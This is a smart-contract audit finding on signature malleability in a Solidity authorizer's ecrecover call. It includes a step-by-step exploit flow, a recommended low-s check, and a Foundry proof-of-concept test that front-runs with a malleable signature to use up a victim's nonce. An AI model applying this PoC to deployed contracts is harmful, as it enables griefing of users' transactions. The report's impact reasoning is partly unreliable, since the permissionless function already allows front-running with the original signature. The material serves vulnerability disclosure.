### Title
Signature Malleability in `EcrecoverAuthorizer.setIsAuthorized` Allows Nonce Consumption via Malleable Signature - (`src/periphery/EcrecoverAuthorizer.sol`)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` passes the raw `(v, r, s)` tuple directly to `ecrecover` with no check that `s` is in the lower half of the secp256k1 curve order. Because secp256k1 is symmetric, `(v^1, r, n−s)` is a second valid signature for the same digest recovering to the same address. Since the function is permissionless, any observer can front-run the maker's pending transaction with the malleable form, consuming the nonce and causing the maker's original transaction to revert with `InvalidNonce`.

### Finding Description
**Root cause — missing s-value bound check:**

In `src/periphery/EcrecoverAuthorizer.sol` line 31, the contract calls:

```solidity
address signer = ecrecover(digest, signature.v, signature.r, signature.s);
``` [1](#0-0) 

There is no guard of the form `require(uint256(signature.s) <= SECP256K1_N_DIV_2)`. Solidity's built-in `ecrecover` precompile accepts both `(v, r, s)` and `(v XOR 1, r, n − s)` as valid signatures for the same message, both recovering to the same signer address.

**Permissionless submission confirmed:**

The function has no `msg.sender` restriction — any caller may submit any `(authorization, signature)` pair: [2](#0-1) 

This is explicitly tested and confirmed in `testEcrecoverAuthorizerPermissionless`: [3](#0-2) 

**Nonce increment on line 26:**

```solidity
require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
``` [4](#0-3) 

The nonce is incremented atomically on every successful call. Once consumed by the malleable submission, the original `(v, r, s)` signature over the same `authorization` struct (which encodes `nonce = 0`) will fail the nonce check.

**Exploit flow:**

1. Maker signs `Authorization{authorizer, authorized, isAuthorized, nonce=0, deadline}` producing `(v, r, s)` and broadcasts or shares it off-chain.
2. Attacker computes malleable counterpart: `v' = v XOR 1` (i.e., 27↔28), `s' = n − s` where `n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141`.
3. Attacker calls `ecrecoverAuthorizer.setIsAuthorized(auth, Signature(v', r, s'))` with the identical `auth` struct.
4. `ecrecover(digest, v', r, s')` returns the same `authorizer` address → all checks pass → nonce increments to 1 → authorization is applied.
5. Maker's original transaction arrives: `authorization.nonce == 0` but `nonce[authorizer] == 1` → reverts `InvalidNonce`.

**Existing checks and why they fail:**

| Check | Stops attack? |
|---|---|
| `Expired()` deadline check | No — attacker uses same `auth` struct, deadline unchanged |
| `InvalidNonce()` nonce check | No — attacker submits before maker with nonce=0 |
| `InvalidSignature()` zero-address check | No — malleable sig recovers to same non-zero address |
| `Unauthorized()` signer check | No — same address recovered |
| s-value bound check | **Missing** — this is the root cause |

### Impact Explanation
An unprivileged attacker who observes a signed authorization (from mempool, off-chain relay, or any public channel) can front-run the maker's submission with the malleable signature. The nonce is consumed, and the maker's original signature is permanently invalidated. If the maker's authorization was embedded in an atomic multicall or meta-transaction (e.g., authorize-then-act in one call), the entire operation reverts. The attacker can repeat this for every new nonce the maker attempts to use, as long as they can observe the signature before it is mined.

### Likelihood Explanation
**Preconditions:** The attacker must observe the signed authorization before it is mined. This is trivially satisfied when signatures are broadcast via the public mempool or shared off-chain (e.g., via an API or relayer). The malleable signature computation is pure arithmetic — no special resources required. The attack is repeatable for every nonce.

### Recommendation
Add a low-s check immediately before or after the `ecrecover` call, matching the EIP-2 / OpenZeppelin ECDSA convention:

```solidity
uint256 constant SECP256K1_N_DIV_2 =
    0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0;

require(uint256(signature.s) <= SECP256K1_N_DIV_2, InvalidSignature());
address signer = ecrecover(digest, signature.v, signature.r, signature.s);
```

This ensures only the canonical (low-s) form of any signature is accepted, making each signed authorization truly single-use and non-malleable.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {EcrecoverAuthorizerTest} from "./SetIsAuthorizedWithSigTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";
import {IEcrecoverAuthorizer} from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract MalleabilityPoC is EcrecoverAuthorizerTest {
    uint256 constant SECP256K1_N =
        0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function testSignatureMalleabilityConsumesNonce() public {
        // Setup: borrower authorizes ecrecoverAuthorizer to act on its behalf
        vm.prank(borrower);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);

        // Maker (borrower) signs authorization with nonce=0
        Authorization memory auth = makeAuthorization(borrower, lender, true);
        Signature memory sig = signAuthorization(auth, borrower);

        // Attacker computes malleable signature: v' = v^1, s' = n - s
        Signature memory malleableSig = Signature({
            v: sig.v == 27 ? 28 : 27,
            r: sig.r,
            s: bytes32(SECP256K1_N - uint256(sig.s))
        });

        // Verify malleable sig recovers to same address
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        address recoveredOriginal = ecrecover(digest, sig.v, sig.r, sig.s);
        address recoveredMalleable = ecrecover(digest, malleableSig.v, malleableSig.r, malleableSig.s);
        assertEq(recoveredOriginal, recoveredMalleable); // same signer

        // Attacker front-runs with malleable signature — succeeds
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        ecrecoverAuthorizer.setIsAuthorized(auth, malleableSig);

        // Nonce is now 1; authorization was applied
        assertEq(ecrecoverAuthorizer.nonce(borrower), 1);
        assertEq(midnight.isAuthorized(borrower, lender), true);

        // Maker's original transaction now fails with InvalidNonce
        vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
        ecrecoverAuthorizer.setIsAuthorized(auth, sig);
    }
}
```

**Expected assertions:**
- `recoveredOriginal == recoveredMalleable` — confirms `ecrecover` accepts both forms
- `nonce(borrower) == 1` after attacker's submission — nonce consumed
- Maker's original `setIsAuthorized` call reverts `InvalidNonce` — original signature invalidated

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L24-26)
```text
    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L31-31)
```text
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
```

**File:** test/SetIsAuthorizedWithSigTest.sol (L74-86)
```text
    function testEcrecoverAuthorizerPermissionless() public {
        vm.prank(borrower);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);
        Authorization memory auth = makeAuthorization(borrower, lender, true);
        Signature memory sig = signAuthorization(auth, borrower);

        // Anyone can submit — no caller auth needed
        vm.prank(otherLender);
        ecrecoverAuthorizer.setIsAuthorized(auth, sig);

        assertEq(midnight.isAuthorized(borrower, lender), true);
        assertEq(ecrecoverAuthorizer.nonce(borrower), 1);
    }
```
